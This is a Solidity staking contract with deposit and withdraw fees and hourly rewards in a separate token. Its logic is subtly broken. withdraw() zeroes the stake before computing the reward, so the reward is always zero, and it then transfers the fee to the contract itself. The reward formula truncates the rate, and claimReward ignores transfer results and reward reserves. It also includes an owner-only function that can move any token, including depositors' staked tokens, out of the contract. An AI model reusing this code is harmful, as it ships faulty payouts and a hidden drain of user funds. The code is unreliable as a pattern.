// SPDX-License-Identifier: MIT
import "./ReentrancyGuard.sol";
import "./Math.sol";
import "./IERC20.sol";

pragma solidity 0.8.17;

contract StakingContract is ReentrancyGuard {
    using Math for uint256;

    IERC20 public rewardToken;
    IERC20 public stakingToken;
    uint256 public depositFee;
    uint256 public withdrawFee;
    uint256 public rewardPerTokenPerHour;
    uint256 public totalStakedTokens;
    address public owner;

    mapping (address => uint256) public stakes;
    mapping (address => uint256) public lastStakeTime;

    constructor(uint256 _rewardPerTokenPerHour, address _rewardTokenAddress, address _stakingTokenAddress) {
        depositFee = 3;
        withdrawFee = 5;
        rewardPerTokenPerHour = _rewardPerTokenPerHour;
        rewardToken = IERC20(_rewardTokenAddress);
        stakingToken = IERC20(_stakingTokenAddress);
        owner = msg.sender;
    }
modifier onlyOwner {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }
  modifier notContract() {
        require(!_isContract(msg.sender), "Contract not allowed");
        require(msg.sender == tx.origin, "Proxy contract not allowed");
        _;
    }
     function _isContract(address addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(addr)
        }
        return (size > 0);
    }
    function stake(uint256 _amount) external notContract() {
        require(_amount > 0, "StakingContract: deposit amount must be greater than 0");

        uint256 depositAmount = _amount.sub(_amount.mul(depositFee).div(100));
        require(stakingToken.transferFrom(msg.sender, address(this), _amount), "StakingContract: failed to transfer tokens");

        stakes[msg.sender] = stakes[msg.sender].add(depositAmount);
        lastStakeTime[msg.sender] = block.timestamp;
        totalStakedTokens = totalStakedTokens.add(depositAmount);
    }

    function withdraw() external nonReentrant notContract() {
        uint256 stakeAmount = stakes[msg.sender];
        require(stakeAmount > 0, "StakingContract: nothing to withdraw");

        uint256 withdrawAmount = stakeAmount.sub(stakeAmount.mul(withdrawFee).div(100));

        stakes[msg.sender] = 0;
        lastStakeTime[msg.sender] = 0;

        uint256 rewardAmount = calculateReward(msg.sender);
        if (rewardAmount > 0) {
            require(rewardToken.transfer(msg.sender, rewardAmount), "StakingContract: failed to transfer reward tokens");
        }

        uint256 totalWithdrawAmount = withdrawAmount.add(rewardAmount);
        require(stakingToken.transfer(msg.sender, totalWithdrawAmount), "StakingContract: failed to transfer tokens");

        totalStakedTokens = totalStakedTokens.sub(withdrawAmount);

        uint256 feeAmount = stakeAmount.mul(withdrawFee).div(100);
        require(rewardToken.transfer(address(this), feeAmount), "StakingContract: failed to transfer fee");
    }

  function calculateReward(address user) internal view returns (uint256) {
        uint256 stakeAmount = stakes[user];
        uint256 timeElapsed = block.timestamp - lastStakeTime[user];
        uint256 rewardAmount = stakeAmount.mul(rewardPerTokenPerHour.div(10**18)).mul(timeElapsed).div(3600).mul(10**18);
        uint256 currentReward = rewardToken.balanceOf(address(this));
        rewardAmount = Math.min(currentReward, rewardAmount);
        return rewardAmount;
}



function claimReward() external nonReentrant notContract() {
    uint256 stakeAmount = stakes[msg.sender];
    require(stakeAmount > 0, "StakingContract: nothing to claim");

    uint256 timeElapsed = block.timestamp - lastStakeTime[msg.sender];
    uint256 tokenAmount = stakeAmount / 1e18; // Convert from wei to token
    uint256 rewardAmount = tokenAmount * rewardPerTokenPerHour * timeElapsed / 3600; // Reward per hour

    rewardToken.transfer(msg.sender, rewardAmount);

    lastStakeTime[msg.sender] = block.timestamp;
}

function getRemainingtoken(address user) external view returns (uint256) {
        uint256 stakeAmount = stakes[user];
        uint256 withdrawAmount = stakeAmount.sub(stakeAmount.mul(withdrawFee).div(100));
        uint256 remainingtoken = withdrawAmount.sub(withdrawAmount.mul(depositFee).div(100));
        return remainingtoken;
}

function getCurrentRewardPerSecond() external view returns (uint256) {
    uint256 stakeAmount = stakes[msg.sender];
    uint256 timeElapsed = block.timestamp - lastStakeTime[msg.sender];
    uint256 rewardPerTokenPerSecond = rewardPerTokenPerHour.div(3600); // recompensa por token por segundo
    uint256 rewardAmount = stakeAmount.mul(rewardPerTokenPerSecond).mul(timeElapsed);

    uint256 rewardAmountInTokens = rewardAmount.div(10 ** 18);

    return rewardAmountInTokens;
}

function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }

    function contractBalance() public view returns (uint256) {
        return rewardToken.balanceOf(address(this));
    }

function getcontractBalance() public view returns (uint256) {
        return stakingToken.balanceOf(address(this));
    }
        fallback () external payable {
}
receive () external payable {
}
}